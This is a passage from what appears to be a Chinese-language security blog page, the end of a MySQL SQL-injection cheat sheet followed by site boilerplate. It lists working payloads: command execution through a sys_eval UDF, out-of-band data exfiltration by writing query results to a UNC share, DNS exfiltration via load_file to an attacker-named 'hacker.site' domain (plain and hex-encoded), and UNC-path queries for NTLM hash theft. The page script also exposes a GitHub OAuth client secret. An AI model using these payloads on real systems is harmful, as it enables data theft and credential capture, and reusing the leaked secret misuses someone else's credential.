+<p>Use instead of which allows less symbols to be displayed * group_concat() = 1024 symbols * json_arrayagg() &gt; 16,000,000 symbolsjson_arrayagg()group_concat()</p>
+<h2 id="udf-命令执行-提权">UDF 命令执行 &amp; 提权</h2>
+<blockquote>
+<p>首先查看是否安装	UDF  <code>$ whereis lib_mysqludf_sys.so</code></p>
+</blockquote>
+<pre><code class="language-text">$ mysql -u root -p mysql
+Enter password: [...]
+mysql&gt; SELECT sys_eval('id');
++--------------------------------------------------+
+| sys_eval('id') |
++--------------------------------------------------+
+| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
++--------------------------------------------------+
+</code></pre>
+<h2 id="mysql-消息外带">Mysql 消息外带</h2>
+<blockquote>
+<p>用于无回显的环境中</p>
+</blockquote>
+<pre><code class="language-text">select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
+select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
+</code></pre>
+<h2 id="dns-外带">DNS 外带</h2>
+<pre><code>select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
+select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
+</code></pre>
+<h2 id="unc-路径-ntlm-hash-窃取">UNC 路径 - NTLM Hash 窃取</h2>
+<pre><code class="language-text">select load_file('\\\\error\\abc');
+select load_file(0x5c5c5c5c6572726f725c5c616263);
+select 'osanda' into dumpfile '\\\\error\\abc';
+select 'osanda' into outfile '\\\\error\\abc';
+load data infile '\\\\error\\abc' into table database.table_name;
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://Zer0-hex.github.io/aAfFAptwJ/" class="post-title gt-a-link">
+                    SQL 注入修复措施
+                </a>
+            </div>
+        
+
+        
+
+        
+            
+                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+<script>
+    // md5.min.js
+    !function(n){
+        "use strict";
+        function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}
+        function f(n,t,r,e,o,u){return d((c=d(d(t,n),d(e,u)))<<(f=o)|c>>>32-f,r);var c,f}
+        function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}
+        function v(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}
+        function g(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}
+        function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}
+        function i(n,t){var r,e,o,u,c;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;var f=1732584193,i=-271733879,a=-1732584194,h=271733878;for(r=0;r<n.length;r+=16)f=l(e=f,o=i,u=a,c=h,n[r],7,-680876936),h=l(h,f,i,a,n[r+1],12,-389564586),a=l(a,h,f,i,n[r+2],17,606105819),i=l(i,a,h,f,n[r+3],22,-1044525330),f=l(f,i,a,h,n[r+4],7,-176418897),h=l(h,f,i,a,n[r+5],12,1200080426),a=l(a,h,f,i,n[r+6],17,-1473231341),i=l(i,a,h,f,n[r+7],22,-45705983),f=l(f,i,a,h,n[r+8],7,1770035416),h=l(h,f,i,a,n[r+9],12,-1958414417),a=l(a,h,f,i,n[r+10],17,-42063),i=l(i,a,h,f,n[r+11],22,-1990404162),f=l(f,i,a,h,n[r+12],7,1804603682),h=l(h,f,i,a,n[r+13],12,-40341101),a=l(a,h,f,i,n[r+14],17,-1502002290),f=v(f,i=l(i,a,h,f,n[r+15],22,1236535329),a,h,n[r+1],5,-165796510),h=v(h,f,i,a,n[r+6],9,-1069501632),a=v(a,h,f,i,n[r+11],14,643717713),i=v(i,a,h,f,n[r],20,-373897302),f=v(f,i,a,h,n[r+5],5,-701558691),h=v(h,f,i,a,n[r+10],9,38016083),a=v(a,h,f,i,n[r+15],14,-660478335),i=v(i,a,h,f,n[r+4],20,-405537848),f=v(f,i,a,h,n[r+9],5,568446438),h=v(h,f,i,a,n[r+14],9,-1019803690),a=v(a,h,f,i,n[r+3],14,-187363961),i=v(i,a,h,f,n[r+8],20,1163531501),f=v(f,i,a,h,n[r+13],5,-1444681467),h=v(h,f,i,a,n[r+2],9,-51403784),a=v(a,h,f,i,n[r+7],14,1735328473),f=g(f,i=v(i,a,h,f,n[r+12],20,-1926607734),a,h,n[r+5],4,-378558),h=g(h,f,i,a,n[r+8],11,-2022574463),a=g(a,h,f,i,n[r+11],16,1839030562),i=g(i,a,h,f,n[r+14],23,-35309556),f=g(f,i,a,h,n[r+1],4,-1530992060),h=g(h,f,i,a,n[r+4],11,1272893353),a=g(a,h,f,i,n[r+7],16,-155497632),i=g(i,a,h,f,n[r+10],23,-1094730640),f=g(f,i,a,h,n[r+13],4,681279174),h=g(h,f,i,a,n[r],11,-358537222),a=g(a,h,f,i,n[r+3],16,-722521979),i=g(i,a,h,f,n[r+6],23,76029189),f=g(f,i,a,h,n[r+9],4,-640364487),h=g(h,f,i,a,n[r+12],11,-421815835),a=g(a,h,f,i,n[r+15],16,530742520),f=m(f,i=g(i,a,h,f,n[r+2],23,-995338651),a,h,n[r],6,-198630844),h=m(h,f,i,a,n[r+7],10,1126891415),a=m(a,h,f,i,n[r+14],15,-1416354905),i=m(i,a,h,f,n[r+5],21,-57434055),f=m(f,i,a,h,n[r+12],6,1700485571),h=m(h,f,i,a,n[r+3],10,-1894986606),a=m(a,h,f,i,n[r+10],15,-1051523),i=m(i,a,h,f,n[r+1],21,-2054922799),f=m(f,i,a,h,n[r+8],6,1873313359),h=m(h,f,i,a,n[r+15],10,-30611744),a=m(a,h,f,i,n[r+6],15,-1560198380),i=m(i,a,h,f,n[r+13],21,1309151649),f=m(f,i,a,h,n[r+4],6,-145523070),h=m(h,f,i,a,n[r+11],10,-1120210379),a=m(a,h,f,i,n[r+2],15,718787259),i=m(i,a,h,f,n[r+9],21,-343485551),f=d(f,e),i=d(i,o),a=d(a,u),h=d(h,c);return[f,i,a,h]}
+        function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}
+        function h(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}
+        function e(n){var t,r,e="0123456789abcdef",o="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),o+=e.charAt(t>>>4&15)+e.charAt(15&t);return o}
+        function r(n){return unescape(encodeURIComponent(n))}
+        function o(n){return a(i(h(t=r(n)),8*t.length));var t}
+        function u(n,t){return function(n,t){var r,e,o=h(n),u=[],c=[];for(u[15]=c[15]=void 0,16<o.length&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(h(t)),512+8*t.length),a(i(c.concat(e),640))}(r(n),r(t))}
+        function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}
+        "function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t;
+    }(this);
+</script>
+
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'd5db68d1feb8dd6e2a87',
+    clientSecret: 'b8cd8701cf17df1e15befdab09621f3547560417',
+    repo: 'zer0-hex.github.io',
+    owner: 'Zer0-hex',
+    admin: ['Zer0-hex'],
+    id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false       // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+            
+
+            
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">Valar Morghulis,Valar Dohaeris</div>
+    <div class="social-container">
+        
+            
+                <a href="https://Zer0-hex.github.io" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://twitter.com/_Zer0_hex_" target="_blank">
+                    <i class="fab fa-twitter gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        
+    </div>
+    <div>
+        Blog for <a
+                href="https://Zer0-hex.github.io" target="_blank">Zer0-hex | <a href="https://Zer0-hex.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
